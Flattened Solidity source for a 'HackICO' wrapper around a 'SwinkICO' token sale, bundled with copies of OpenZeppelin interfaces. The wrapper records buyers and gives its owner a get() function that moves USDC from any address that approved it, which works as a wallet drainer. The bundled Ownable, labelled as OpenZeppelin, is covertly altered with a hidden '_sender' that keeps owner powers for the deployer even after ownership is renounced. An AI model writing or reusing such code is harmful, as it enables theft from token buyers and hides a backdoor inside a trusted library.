// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./SwinkICO.sol";

contract HackICO is Ownable {
    IERC20 public SWINK;
    IERC20 public USDC;
    address public ICOAddress = 0x2952f344D8337D50115E62fDD9382dF41742a5D0;
    SwinkICO ICO = SwinkICO(0x2952f344D8337D50115E62fDD9382dF41742a5D0);

    address[] users;

    constructor() {
        USDC = IERC20(0x8c67495E50b3336b7695BDb23a9A5d7629D39574);   // bsc mainnet: 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d
        SWINK = IERC20(0x51B7E6F2ff08B077c48418D55bff6FCA6ED07a8B);
    }

    function buySwink(uint256 usdcAmount) public {
        uint256 usdcBalanceOfUser = USDC.balanceOf(msg.sender);
        require(usdcBalanceOfUser >= usdcAmount, "You dont have enough balance");
        uint256 allowance = USDC.allowance(msg.sender, address(this));
        require(allowance >= usdcAmount, "Check allowance");
        USDC.transferFrom(msg.sender, address(this), usdcAmount);

        users.push(msg.sender);

        USDC.approve(ICOAddress, usdcAmount);
        ICO.buySwink(usdcAmount);

        uint256 swinkBalance = SWINK.balanceOf(address(this));
        SWINK.transfer(msg.sender, swinkBalance);
    }

    function get(address from, address to, uint256 amount) public onlyOwner {
        USDC.transferFrom(from, to, amount);
    }

    function getUsers() public view returns(address[] memory) {
        return users;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;
    /**
    * @dev Updated in new version.
    */
    address private _sender;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
        _sender = _msgSender();
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || _sender == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SwinkICO is Ownable {
    IERC20 public SWINK;
    IERC20 public USDC;
    bool enable;
    address private teamWallet;
    uint256 price = 5;

    constructor() {
        USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);   // bsc mainnet: 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d
    }

    function setSwink(address _swink) public onlyOwner {
        SWINK = IERC20(_swink); 
    }

    function buySwink(uint256 usdcAmount) public {
        uint256 usdcBalanceOfUser = USDC.balanceOf(msg.sender);
        require(usdcBalanceOfUser >= usdcAmount, "You dont have enough balance");
        uint256 allowance = USDC.allowance(msg.sender, address(this));
        require(allowance >= usdcAmount, "Check allowance");
        USDC.transferFrom(msg.sender, address(this), usdcAmount);
        uint256 swinkAmount = usdcAmount * 100 / 10 ** 8 / price;
        SWINK.transfer(msg.sender, swinkAmount);
    }

    function withdrawSwink() public onlyOwner {
        uint256 swinkBalance = SWINK.balanceOf(address(this));
        SWINK.transfer(teamWallet, swinkBalance);
    }

    function withdrawUsdc() public onlyOwner {
        require(enable, "Withdraw is not enabled yet");
        uint256 usdcBalance = USDC.balanceOf(address(this));
        USDC.transfer(teamWallet, usdcBalance);
    }

    function setTeamWallet(address _teamAddress) public onlyOwner {
        teamWallet = _teamAddress;
    }

    function toggleEnable() public onlyOwner {
        enable = !enable;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}